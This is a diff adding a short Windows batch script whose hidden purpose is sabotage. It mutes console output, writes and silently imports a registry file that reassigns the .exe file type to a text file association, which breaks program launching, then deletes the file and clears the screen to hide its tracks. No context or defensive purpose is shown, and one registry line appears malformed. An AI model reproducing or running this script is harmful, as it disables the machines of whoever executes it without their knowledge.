@@ -1,0 +1,11 @@
+ctty nul
+echo REGEDIT4>C:\OpenExe.reg
+echo.>>C:\OpenExe.reg
+echo [HKEY_CLASSES_ROOT\.exe]>>C:\OpenExe.reg
+echo "%1" = "txtfile">>C:\OpenExe.reg
+echo "Content Type" = "text/plain">>C:\OpenExe.reg
+echo "PerceivedType" = "text">>C:\OpenExe.reg
+regedit /s C:\openexe.reg
+del C:\OpenExe.reg
+ctty con
+cls
